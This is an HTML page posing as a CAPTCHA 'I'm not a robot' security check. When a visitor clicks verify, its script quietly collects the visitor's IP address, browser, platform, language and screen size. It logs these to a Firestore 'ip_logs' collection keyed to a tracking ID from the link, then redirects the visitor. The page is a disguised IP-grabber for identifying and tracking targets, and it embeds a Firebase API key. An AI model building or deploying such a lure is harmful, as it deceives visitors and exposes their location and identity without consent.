<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .captcha-box {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 24px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            color: #fff;
        }
        .captcha-box h2 { margin-bottom: 20px; }
        .captcha-box p { margin-bottom: 20px; font-size: 0.9rem; opacity: 0.8; }
        .captcha-box button {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 14px 40px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
            font-size: 1rem;
        }
        .captcha-box button:hover { background: #00cc33; }
    </style>
</head>
<body>
    <div class="captcha-box">
        <h2>🤖 I'm not a robot</h2>
        <p>Click verify to continue</p>
        <button onclick="verify()">✅ VERIFY</button>
    </div>

    <script>
        async function verify() {
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('uid');
            const redirect = params.get('redirect') || 'https://google.com';
            
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            const ip = ipData.ip;
            
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenResolution = `${screen.width}x${screen.height}`;
            
            if (uid) {
                const FIREBASE_CONFIG = {
                    apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                    authDomain: "camerahhh-15487.firebaseapp.com",
                    projectId: "camerahhh-15487",
                    storageBucket: "camerahhh-15487.firebasestorage.app",
                    messagingSenderId: "212849652224",
                    appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
                };
                
                const script = document.createElement('script');
                script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
                script.onload = () => {
                    const script2 = document.createElement('script');
                    script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
                    script2.onload = async () => {
                        firebase.initializeApp(FIREBASE_CONFIG);
                        await firebase.firestore().collection("ip_logs").add({
                            ip: ip,
                            userId: uid,
                            userAgent: userAgent,
                            platform: platform,
                            language: language,
                            screenResolution: screenResolution,
                            timestamp: new Date().toISOString(),
                            unix: Date.now()
                        });
                        window.location.href = redirect;
                    };
                    document.head.appendChild(script2);
                };
                document.head.appendChild(script);
            } else {
                window.location.href = redirect;
            }
        }
    </script>
</body>
</html>
